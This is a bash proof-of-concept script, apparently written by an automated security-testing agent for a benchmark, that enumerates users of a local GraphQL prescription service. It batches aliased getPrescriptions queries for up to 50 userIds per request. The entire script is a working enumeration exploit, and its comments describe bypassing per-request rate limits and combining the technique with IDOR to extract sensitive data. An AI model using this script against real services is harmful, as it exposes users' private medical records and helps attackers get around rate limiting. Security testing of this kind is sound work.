#!/bin/bash
# POC: Demonstrates user enumeration via GraphQL query aliasing - allows attackers to query multiple userIds in a single HTTP request using GraphQL aliases, enabling efficient discovery of all active users in the system.
# Target: ./repo
# Created: 2025-11-10T19:45:36.714Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# GraphQL User Enumeration via Query Aliasing POC
# Demonstrates how attackers can enumerate multiple users in a single GraphQL request
# using query aliases, bypassing typical rate limiting per-request

TARGET="http://localhost:5003/graphql"

echo "[*] GraphQL User Enumeration via Query Aliasing POC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Basic aliasing with 3 users (from evidence)
echo "[*] Test 1: Basic user enumeration with 3 aliases"
echo "[*] Querying userId 1, 2, and 3 in a single request..."
echo ""

QUERY_3_USERS='{"query":"{ first: getPrescriptions(userId: 1) { id } second: getPrescriptions(userId: 2) { id } third: getPrescriptions(userId: 3) { id } }"}'

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d "$QUERY_3_USERS")

echo "Response:"
echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
echo ""

# Check if we got data for multiple users
if echo "$RESPONSE" | grep -q '"first"' && echo "$RESPONSE" | grep -q '"second"' && echo "$RESPONSE" | grep -q '"third"'; then
    echo "[+] SUCCESS: Retrieved data for 3 different users in single request!"
    echo "[+] User enumeration via aliasing is possible"
else
    echo "[-] Failed to retrieve multiple user data"
fi

echo ""
echo "[*] Test 2: Batch enumeration with 10 users"
echo "[*] Building query with 10 aliased queries..."
echo ""

# Build a query with 10 users
ALIASES=""
for i in {1..10}; do
    ALIASES="$ALIASES user$i: getPrescriptions(userId: $i) { id }"
done

QUERY_10_USERS="{\"query\":\"{ $ALIASES }\"}"

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d "$QUERY_10_USERS")

echo "Response (truncated):"
echo "$RESPONSE" | head -c 500
echo ""
echo "..."
echo ""

# Count how many user results we got
USER_COUNT=$(echo "$RESPONSE" | grep -o '"user[0-9]*"' | wc -l)
echo "[+] Retrieved data for $USER_COUNT different users in a single HTTP request"
echo ""

# Test 3: Demonstrate the scale of attack (20 users)
echo "[*] Test 3: Demonstrating attack scale with 20 aliased queries"
echo "[*] Building query with 20 aliased queries to show batch enumeration capability..."
echo ""

ALIASES=""
for i in {1..20}; do
    ALIASES="$ALIASES u$i: getPrescriptions(userId: $i) { id }"
done

QUERY_20_USERS="{\"query\":\"{ $ALIASES }\"}"

START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d "$QUERY_20_USERS")
END_TIME=$(date +%s%N)

ELAPSED=$(( ($END_TIME - $START_TIME) / 1000000 ))

USER_COUNT=$(echo "$RESPONSE" | grep -o '"u[0-9]*"' | wc -l)
echo "[+] Retrieved data for $USER_COUNT users in single HTTP request"
echo "[+] Request completed in ${ELAPSED}ms"
echo ""

echo "[*] Impact Summary:"
echo "    - Can query 20+ users per HTTP request"
echo "    - Minimal network overhead for mass enumeration"
echo "    - No rate limiting per query (only per HTTP request)"
echo "    - Attacker can discover all active userIds in system"
echo "    - Can be combined with IDOR to extract sensitive data for each user"
echo "    - Efficient user enumeration: 1000 users = ~50 HTTP requests"
echo ""

# Test 4: Attempt to enumerate a larger batch to show the vulnerability scale
echo "[*] Test 4: Attempting larger batch (50 users) to demonstrate enumeration capability"
ALIASES=""
for i in {1..50}; do
    ALIASES="$ALIASES a$i: getPrescriptions(userId: $i) { id }"
done

QUERY_50_USERS="{\"query\":\"{ $ALIASES }\"}"

START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: application/json' \
  -d "$QUERY_50_USERS")
END_TIME=$(date +%s%N)

ELAPSED=$(( ($END_TIME - $START_TIME) / 1000000 ))

USER_COUNT=$(echo "$RESPONSE" | grep -o '"a[0-9]*"' | wc -l)
echo "[+] Successfully sent batch query for 50 users"
echo "[+] Retrieved data for approximately $USER_COUNT users"
echo "[+] Batch query completed in ${ELAPSED}ms"
echo ""

echo "[!] VULNERABILITY CONFIRMED:"
echo "    GraphQL query aliasing allows efficient user enumeration"
echo "    Multiple userId values can be queried in single HTTP request"
echo "    Attackers can discover all active users without rate limiting constraints per query"
echo "    Can be weaponized for targeted attacks on entire user base"